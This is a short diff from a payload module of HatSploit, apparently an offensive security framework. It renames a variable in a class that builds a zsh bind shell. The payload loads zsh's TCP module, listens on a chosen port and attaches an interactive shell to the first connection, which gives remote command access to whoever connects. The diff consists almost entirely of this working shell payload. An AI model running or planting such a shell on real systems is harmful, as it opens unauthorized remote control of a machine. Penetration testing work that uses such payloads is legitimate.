@@ -24,7 +24,7 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        remote_port = self.handler['BPORT']
+        bind_port = self.handler['BPORT']
 
-        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp -l {remote_port} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp -l {bind_port} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
         return payload
